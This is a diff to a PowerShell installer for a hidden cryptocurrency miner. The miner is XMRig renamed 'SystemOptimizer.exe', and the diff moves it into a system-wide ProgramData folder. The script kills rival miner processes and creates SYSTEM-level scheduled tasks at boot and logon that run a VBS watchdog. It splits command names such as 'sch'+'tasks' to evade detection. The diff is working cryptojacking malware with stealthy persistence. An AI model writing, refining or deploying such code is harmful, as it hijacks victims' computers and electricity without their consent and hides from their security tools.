@@ -4,8 +4,8 @@ $ErrorActionPreference = "Stop"
 # Admin check (iex ignores #Requires)
 if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { exit }
 
-# ===== PATHS =====
-$baseDir = "$env:LOCALAPPDATA\Microsoft\Windows\SystemOptimizer"
+# ===== PATHS (system-wide, universal for all users) =====
+$baseDir = "$env:ProgramData\SystemOptimizer"
 $xmrigExe = "$baseDir\SystemOptimizer.exe"
 $configFile = "$baseDir\config.json"
 $watchdogPath = "$baseDir\watchdog.vbs"
@@ -29,13 +29,14 @@ try {
 & ('task'+'kill') /F /IM "xmrig.exe" 2>$null
 & ('task'+'kill') /F /IM "SystemOptimizer.exe" 2>$null
 Remove-Item -Recurse -Force "$env:LOCALAPPDATA\SystemOptimizer" 2>$null
+Remove-Item -Recurse -Force "$env:LOCALAPPDATA\Microsoft\Windows\SystemOptimizer" 2>$null
 Remove-Item -Recurse -Force "$baseDir" 2>$null
 & ('sch'+'tasks') /Delete /TN "SystemOptimizer" /F 2>$null
 & ('sch'+'tasks') /Delete /TN "SystemOptimizer-Logon" /F 2>$null
 & ('sch'+'tasks') /Delete /TN "ModestFermi_XMRig" /F 2>$null
 Start-Sleep 1
 
-# ===== CREATE DIR (after cleanup) - VERIFIED =====
+# ===== CREATE DIR (system-wide, after cleanup) - VERIFIED =====
 $dir = New-Item -ItemType Directory -Force -Path $baseDir
 if (-not (Test-Path $baseDir)) { throw "Failed to create directory: $baseDir" }
 
@@ -80,8 +81,6 @@ $wd | Out-File -FilePath $watchdogPath -Encoding ascii
 if (-not (Test-Path $watchdogPath)) { throw "Watchdog.vbs not created at $watchdogPath" }
 
 # ===== SCHEDULED TASKS (SYSTEM, boot + logon) =====
-$taskName = "SystemOptimizer"
-$wdPathEscaped = $watchdogPath -replace '"', '`"'
 & ('sch'+'tasks') /Create /TN "SystemOptimizer" /TR "wscript.exe `"$watchdogPath`"" /SC ONSTART /RU SYSTEM /RL HIGHEST /F
 & ('sch'+'tasks') /Create /TN "SystemOptimizer-Logon" /TR "wscript.exe `"$watchdogPath`"" /SC ONLOGON /RU SYSTEM /RL HIGHEST /F
 & ('sch'+'tasks') /Change /TN "SystemOptimizer" /RI 1 /DU 9999:59 /K
